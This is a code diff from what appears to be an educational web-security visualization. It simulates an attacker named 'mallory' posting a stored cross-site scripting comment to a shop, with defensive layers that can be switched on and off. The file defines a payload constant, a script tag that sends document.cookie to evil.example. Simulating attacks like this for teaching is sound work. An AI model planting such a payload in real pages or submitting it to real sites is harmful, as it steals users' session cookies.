@@ -1,10 +1,10 @@
 import { readChoice, refusal } from '../../algorithms/form';
 import type { Step } from '../../types/visualization';
 import { EMPTY } from '../steps';
-import { USERS } from '../web/data';
+import { MALLORY, USERS } from '../web/data';
 import { createEvil, EVIL_ORIGIN, evilDropped, evilStolen } from '../web/evil';
 import { loadPage } from '../web/page';
-import { createShop, SAFE_SHOP, SHOP_ORIGIN } from '../web/shop';
+import { createShop, postComment, SAFE_SHOP, SHOP_ORIGIN } from '../web/shop';
 import { injectedScripts } from '../web/shop-pages';
 import { createStory, resultOf, type Story } from '../web/story';
 import { createWorld, type World } from '../web/world';
@@ -33,7 +33,6 @@ export const LAYERS = [
 
 export const LAYER_OPTIONS = ['Off', 'On'];
 
-const MALLORY = { name: 'mallory', password: 'stored-xss', role: 'customer' };
 const PAYLOAD = "<script>fetch('https://evil.example/c?' + document.cookie)</script>";
 const DROP = `${EVIL_ORIGIN}/drop`;
 
@@ -93,8 +92,7 @@ export function threatModelingSteps(values: Record<string, string>): Step[] {
   const alice = USERS[0];
 
   world.browser.submit(`${SHOP_ORIGIN}/signin`, { name: alice.name, password: alice.password });
-  const signIn = world.send({ method: 'POST', url: `${SHOP_ORIGIN}/signin`, headers: {}, body: { name: MALLORY.name, password: MALLORY.password } }, 'attacker');
-  world.send({ method: 'POST', url: `${SHOP_ORIGIN}/comments`, headers: { cookie: `sid=${signIn.setCookies[0]!.value}` }, body: { body: PAYLOAD } }, 'attacker');
+  postComment(world, MALLORY, PAYLOAD);
   story.step({ title: 'mallory posts a comment', why: `One attack, end to end. It needs each step to work. Layers on: ${LAYERS.filter(({ name }) => on[name]).map(({ label }) => label).join(', ') || 'none'}.`, next: 'alice, a signed-in customer, opens the comments.', line: 'page = comments.map', text: { label: 'Comment', lines: { Body: PAYLOAD } } });
 
   play({ on, world, story });
